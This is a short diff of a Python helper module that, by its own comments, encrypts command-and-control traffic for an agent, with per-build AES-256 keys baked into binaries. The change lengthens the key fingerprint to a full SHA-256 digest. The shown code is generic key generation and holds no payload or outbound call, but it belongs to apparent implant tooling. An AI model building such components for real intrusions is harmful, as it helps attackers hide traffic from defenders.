@@ -1,7 +1,7 @@
 # AES-256-GCM helpers for C2 traffic encryption.
 # Each build gets a fresh key baked into the binary at compile time.
 # The server looks it up via the kid fingerprint the agent includes in every request.
-# Wire format: {"kid": "<8-char fingerprint>", "data": "<base64(nonce + ciphertext + tag)>"}
+# Wire format: {"kid": "<key fingerprint>", "data": "<base64(nonce + ciphertext + tag)>"}
 
 import base64
 import hashlib
@@ -14,11 +14,11 @@ def generate_key() -> tuple[str, str]:
     """
     Generate a fresh AES-256 key for a new build.
     Returns (key_hex, key_id): key_hex is the secret baked into the binary,
-    key_id is a short SHA-256 fingerprint used to look it up server-side.
+    key_id is a 64-character SHA-256 fingerprint used to look it up server-side.
     """
     key_bytes = os.urandom(32)
     key_hex   = key_bytes.hex()
-    key_id    = hashlib.sha256(key_bytes).hexdigest()[:8]
+    key_id    = hashlib.sha256(key_bytes).hexdigest()
     return key_hex, key_id
 
 
